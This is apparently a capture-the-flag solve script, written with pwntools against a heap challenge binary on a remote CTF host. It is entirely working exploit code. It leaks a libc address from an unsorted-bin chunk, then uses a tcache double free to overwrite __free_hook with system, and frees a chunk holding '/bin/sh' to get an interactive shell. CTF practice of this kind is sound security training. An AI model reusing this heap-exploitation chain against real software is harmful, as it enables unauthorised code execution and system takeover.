#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF("./libc.so.6", checksec = False)
ld = ELF("./ld-2.27.so", checksec = False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()
# =========================================================
#                         EXPLOITS
# =========================================================

def alloc(index, size):
    r.sendline(b'1')
    r.sendlineafter(b"Where? ", str(index).encode())
    r.sendlineafter(b"size? ", str(size).encode())

def free(index):
    r.sendline(b'2')
    r.sendlineafter(b"Where? ", str(index).encode())

def view(index):
    r.sendline(b'3')
    r.sendlineafter(b"Where? ", str(index).encode())
    return r.recvline()[:-1]

def edit(index, size, data):
    r.sendline(b'4')
    r.sendlineafter(b"Where? ", str(index).encode())
    r.sendlineafter(b"size? ", str(size).encode())
    r.sendline(data)

alloc(0, 1280)
alloc(1, 32)

## chunk gets stored in the unsorted bin 
free(0) 

## read the fd pointer 
main_arena = u64(view(0).ljust(8, b'\x00')) 
libc_base = main_arena - 0x3afca0
libc.address = libc_base

info(f"Libc Address => {libc.address}")

system = libc.sym.system
free_hook = libc.sym.__free_hook

## overwriting the free_hook with system
alloc(2, 32)
free(2)
free(2)

edit(2, 32, p64(free_hook))
alloc(3, 32)
alloc(4, 32)

edit(4, 32, p64(system))

## call system with /bin/sh param
alloc(6, 32)
edit(6, 32, b'/bin/sh\x00')

free(6)

r.interactive()

